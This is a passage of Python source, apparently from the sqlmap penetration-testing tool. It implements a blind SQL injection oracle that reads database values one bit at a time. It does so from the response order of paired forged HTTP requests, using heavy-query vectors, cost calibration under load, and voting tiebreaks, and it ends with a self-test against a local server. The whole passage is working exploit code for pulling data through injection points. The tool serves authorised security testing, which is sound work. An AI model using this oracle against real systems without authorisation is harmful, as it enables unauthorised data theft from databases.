    # target that hoists the heavy subquery out of the CASE (running it in both branches) is measured with
    # ~0 delta and rejected here instead of engaging into corruption. See _calibrationConditions().
    trueCond, falseCond = _calibrationConditions(dbms)
    best = 0.0
    for cost in LIGHT_HEAVY_COSTS:
        vector = lightHeavyVector(dbms, cost)
        if not vector:
            return (None, None, 0.0)
        reqSlow = _forgeRequest(trueCond, conn.host, vector)
        reqFast = _forgeRequest(falseCond, conn.host, vector)
        # Measure the coalesced-PAIR times: a one-heavy pair (reqSlow vs reqFast) and a no-heavy pair
        # (reqFast vs reqFast). Their separation decides whether a real bit's response ORDER is readable
        # (the reliability gate that picks which cost to engage at).
        try:
            heavyPair = _pairMs(conn, reqSlow, reqFast, timeout=timeout)
            cheapPair = _pairMs(conn, reqFast, reqFast, timeout=timeout)
        except Exception:
            heavyPair = cheapPair = 0.0
        separation = heavyPair - cheapPair
        # Reliability gate: the separation must clear an ABSOLUTE floor AND a FRACTION of the base (cheap)
        # pair time. An absolute-only floor is enough on a fast single-hop path (cockroach base ~8 ms, a
        # 16 ms separation is 2x the base) but marginal on a slow multi-hop one: on Oracle the base pair is
        # ~50 ms, so a 15 ms separation is swamped by round-trip jitter under extraction load and ~10% of
        # TRUE bits flip - even though it calibrates clean IDLE. Requiring separation >= a fraction of the
        # base forces such a target to climb to a cost whose margin survives load (Oracle 60k sep 15 ms ->
        # reject -> 200k sep 61 ms -> 0 flips). A fast path is unaffected (its base is tiny).
        # `loadFactor` (= worker thread count) scales the required margin: N value-parallel workers each
        # fire a heavy query, so the server sees ~Nx load during extraction that single-threaded calibration
        # does not, dragging a marginal bit's cond-last fraction into the ambiguous band. Demanding N x the
        # separation here climbs to a cost whose bigger delta keeps the fraction ~1.0 even under that load.
        if separation < MIN_HEAVY_MS * loadFactor or separation < cheapPair * MIN_SEPARATION_FRAC * loadFactor:
            if progress is not None:
                progress()
            continue                         # margin too thin to survive load -> escalate cost
        usable, confidence = calibrate(conn, reqSlow, reqFast, trials=trials, threshold=threshold, timeout=timeout, progress=progress)
        best = max(best, confidence)
        if usable:
            return (vector, cost, confidence)
    return (None, None, best)


def _forgeRequest(inferenceExpr, authority, vector=None):
    """Forge the full HTTP request sqlmap would send for a payload carrying `inferenceExpr` at the
    INFERENCE_MARKER slot of `vector` (default: the current technique's vector), but capture it
    (buildOnly) instead of sending - ready to coalesce. Late placeholders ([RANDNUM]/[SLEEPTIME]/...)
    are filled by agent.payload just like a normal request."""
    from lib.core.agent import agent
    from lib.core.common import getTechniqueData
    from lib.core.settings import INFERENCE_MARKER
    from lib.request.connect import Connect

    vector = vector if vector is not None else getTechniqueData().vector
    forged = agent.suffixQuery(agent.prefixQuery(vector.replace(INFERENCE_MARKER, inferenceExpr)))
    spec = Connect.queryPage(agent.payload(newValue=forged), buildOnly=True)
    return _specToReq(spec, authority)


def readBitLive(conn, condition, vector=None, votes=1, timeout=30):
    """Read one boolean from the LIVE injection point by timeless timing. `condition` is the comparison
    bisection injects (e.g. 'ORD(...)>64'). The condition request carries it at INFERENCE_MARKER, the
    negation request carries NOT(condition); with a heavy-query `vector` exactly one runs the heavy work,
    so response order names the bit - no SLEEP. `vector` defaults to the current technique's vector
    (rung 1, bare boolean natural delta); pass getHeavyVector() for rung 2. Returns True iff condition holds."""
    reqCond = _forgeRequest(condition, conn.host, vector)
    reqNeg = _forgeRequest("NOT(%s)" % condition, conn.host, vector)
    return readBit(conn, reqCond, reqNeg, votes=votes, timeout=timeout)


def readBitAsymmetric(connSource, reqCond, reqRef, votes=12, timeout=30):
    """Read one boolean WITHOUT the negated comparison - only the condition request and a FIXED always-heavy
    reference. When the condition is TRUE, reqCond runs the SAME heavy work as reqRef, so they race ~50/50
    and reqCond finishes last about HALF the votes; when FALSE - or when the comparison is NULL / the DBMS
    errors on it past the end of a string - reqCond is strictly cheaper and finishes first essentially
    always (~0 cond-last). So the DECISION is a fraction threshold well between those two populations, over
    a FIXED number of votes (no early-exit): a single stray cond-last from jitter can no longer invent a
    phantom character at end-of-string (the bug that appended trailing garbage), while a genuine TRUE still
    clears the threshold comfortably. Used as the tiebreak when the symmetric read splits.
    Returns True iff the condition holds."""
    condLast = 0
    for i in range(votes):
        if i % 2 == 0:
            first, condSid, _hiSid = _pairOrder(connSource, reqCond, reqRef, timeout)
        else:
            first, _loSid, condSid = _pairOrder(connSource, reqRef, reqCond, timeout)
        if first != condSid:               # cond finished last -> it ran the heavy branch this vote
            condLast += 1
    return condLast * 4 >= votes           # >= 25% cond-last -> TRUE (mid-way between ~50% and ~0%)


def calibrateLive(conn, vector=None, trials=40, threshold=0.9, timeout=30, progress=None):
    """Calibrate the live target using a KNOWN asymmetry: INFERENCE=1=1 runs the heavy branch, INFERENCE=1=0
    stays cheap. On a concurrent backend the heavy request finishes last. Returns (usable, confidence);
    below threshold the backend serializes or the delta is unreadable -> do NOT use the oracle."""
    reqSlow = _forgeRequest("1=1", conn.host, vector)
    reqFast = _forgeRequest("1=0", conn.host, vector)
    return calibrate(conn, reqSlow, reqFast, trials=trials, threshold=threshold, timeout=timeout, progress=progress)


if __name__ == "__main__":
    # End-to-end self-test against a local h2 target that gates query cost on ?bit=/&cap= (scratchpad
    # h2sqlserver.py): calibrate, then read a run of known bits and report accuracy.
    import sys

    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8470
    cap = int(sys.argv[3]) if len(sys.argv) > 3 else 8000

    def req(bit):
        return {"method": "GET", "path": "/sql?bit=%d&cap=%d" % (bit, cap), "authority": host}

    conn = connect(host, port, None, 30)
    usable, conf = calibrate(conn, req(1), req(0), trials=40)
    print("calibrate: usable=%s confidence=%.3f" % (usable, conf))
    if usable:
        import itertools
        # Read a run of known bits. reqCond carries the actual condition (truth=b -> req(b) runs heavy
        # iff b=1); reqNeg carries the negation (truth=1-b -> req(1-b) runs heavy iff b=0). Exactly one
        # runs heavy, so a single pair resolves the bit both ways.
        bits = list(itertools.islice(itertools.cycle([1, 0, 1, 1, 0, 0, 1, 0]), 24))
        ok = 0
        for b in bits:
            got = readBit(conn, req(b), req(1 - b), votes=1)
            ok += int(bool(got) == bool(b))
        print("read %d/%d bits correctly (single pair each)" % (ok, len(bits)))
    conn.close()
